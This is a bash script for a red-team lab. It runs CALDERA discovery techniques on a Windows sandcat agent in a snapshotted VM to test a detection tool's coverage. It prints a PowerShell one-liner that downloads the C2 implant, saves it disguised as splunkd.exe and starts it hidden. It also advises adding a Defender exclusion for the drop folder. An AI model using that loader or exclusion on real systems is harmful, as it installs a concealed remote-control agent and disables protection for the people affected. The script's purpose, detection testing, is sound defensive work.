#!/usr/bin/env bash
# caldera-sandbox.sh — run a CALDERA operation on a Windows sandcat agent from inside an isolated
# sandbox (`sbx run claude`), capture each step's endpoint logs over the agent's own C2, and check
# Shikari's detections against them (#30).
#
#   On the host, first:  scripts/telemetry/caldera-lab.sh up && scripts/telemetry/caldera-lab.sh status
#                        (the server's URL and red API key). Snapshot the Windows VM.
#   In the sandbox:      CALDERA_URL=http://<host>:8888 CALDERA_API_KEY=<red key> bash caldera-sandbox.sh
#
# Tunables (env): CALDERA_GROUP=shikari-test  TECHNIQUES=T1033,T1016,T1057,T1082
#                 SHIKARI_DIR=~/shikari  SHIKARI_REPO=cmdaltr/shikari
#
# Only discovery techniques by default: they read the host and change nothing. Nothing runs on the
# agent until you confirm the plan.
set -euo pipefail

: "${CALDERA_URL:?set CALDERA_URL, e.g. http://192.168.1.20:8888 (caldera-lab.sh status on the host)}"
: "${CALDERA_API_KEY:?set CALDERA_API_KEY to the red API key of the server}"
GROUP="${CALDERA_GROUP:-shikari-test}"
TECHNIQUES="${TECHNIQUES:-T1033,T1016,T1057,T1082}"
DIR="${SHIKARI_DIR:-$HOME/shikari}"
REPO="${SHIKARI_REPO:-cmdaltr/shikari}"
CALDERA_URL="${CALDERA_URL%/}"
export CALDERA_URL CALDERA_API_KEY

say() { printf '\n==> %s\n' "$*"; }
die() { printf '\n!! %s\n' "$*" >&2; exit 1; }
api() { curl -sf -H "KEY: $CALDERA_API_KEY" "$CALDERA_URL/api/v2$1"; }
agents_in_group() {
  api /agents | python3 -c "import json,sys; print(sum(1 for a in json.load(sys.stdin) if a.get('group')==sys.argv[1]))" "$GROUP"
}
console() { (cd "$DIR" && printf '%s\n' "use lab/caldera" "$@" "exit" | .venv/bin/shikari console); }

say "Checking the tools"
for t in git curl python3; do command -v "$t" >/dev/null || die "$t is missing"; done
PY=$(command -v python3.11 || command -v python3)
"$PY" -c 'import sys; sys.exit(sys.version_info < (3, 10))' || die "Python 3.10 or later is needed ($("$PY" -V))"

say "Checking CALDERA at $CALDERA_URL"
api /health >/dev/null || die "CALDERA didn't answer with this key: is the server up, and reachable from the sandbox?"

say "Getting Shikari into $DIR"
if [ -d "$DIR/.git" ]; then
  git -C "$DIR" pull --ff-only
elif command -v gh >/dev/null && gh auth status >/dev/null 2>&1; then
  gh repo clone "$REPO" "$DIR"
else
  git clone "https://github.com/$REPO.git" "$DIR"  # private: needs a token in the credential helper
fi
[ -x "$DIR/.venv/bin/shikari" ] || {
  "$PY" -m venv "$DIR/.venv"
  "$DIR/.venv/bin/pip" install -q --upgrade pip
  "$DIR/.venv/bin/pip" install -q -e "$DIR"
}

# The check compares against the detections in data/groups, which a fresh clone doesn't have:
# a technique hunt per technique builds them from every ATT&CK group's procedure examples
say "Building detections for $TECHNIQUES"
for t in ${TECHNIQUES//,/ }; do
  (cd "$DIR" && .venv/bin/shikari offline hunt "$t" </dev/null >/dev/null) || die "the hunt for $t failed"
  echo "   $t: $(ls "$DIR"/data/groups/*.yaml 2>/dev/null | wc -l | tr -d ' ') detection files in the library"
done

if [ "$(agents_in_group)" -eq 0 ]; then
  say "No agent in group $GROUP yet. In an admin PowerShell on the (snapshotted) Windows VM, run:"
  cat <<EOF

  \$server="$CALDERA_URL";\$url="\$server/file/download";\$wc=New-Object System.Net.WebClient;\$wc.Headers.add("platform","windows");\$wc.Headers.add("file","sandcat.go");\$data=\$wc.DownloadData(\$url);[io.file]::WriteAllBytes("C:\\Users\\Public\\splunkd.exe",\$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList "-server \$server -group $GROUP" -WindowStyle hidden

  (Defender quarantines sandcat: add an exclusion for C:\\Users\\Public on the VM first.)
EOF
  printf '\nWaiting for the agent to check in'
  for _ in $(seq 1 60); do
    [ "$(agents_in_group)" -gt 0 ] && break
    printf '.'; sleep 10
  done
  echo
  [ "$(agents_in_group)" -gt 0 ] || die "no agent checked in to $GROUP within 10 minutes"
fi
console "set ACTION status" "run"

say "The plan (a dry run: nothing is created on CALDERA yet)"
console "set ACTION run" "set KIND technique" "set TARGET $TECHNIQUES" "set GROUP $GROUP" "set EXECUTE false" "run"
read -r -p "Run this operation on the agent now? [y/N] " go
[[ "$go" =~ ^[Yy] ]] || { echo "Stopped before running anything."; exit 0; }

NAME="shikari-sbx-$(date -u +%Y%m%d-%H%M%S)"
say "Running $NAME, capturing each step's logs over the agent's C2, then checking"
console "set ACTION run" "set KIND technique" "set TARGET $TECHNIQUES" "set GROUP $GROUP" \
        "set NAME $NAME" "set CAPTURE caldera" "set EXECUTE true" "run"

say "Done. The operation, its capture and the check are in $DIR/data/telemetry/caldera/ and $DIR/data/telemetry/lab/"
cat <<EOF
   Re-run the check:  cd $DIR && printf 'use lab/caldera\nset ACTION check\nset NAME $NAME\nrun\nexit\n' | .venv/bin/shikari console
   Then clean up: kill the agent in CALDERA (Agents → the agent → Kill), and revert the VM to its snapshot.
EOF
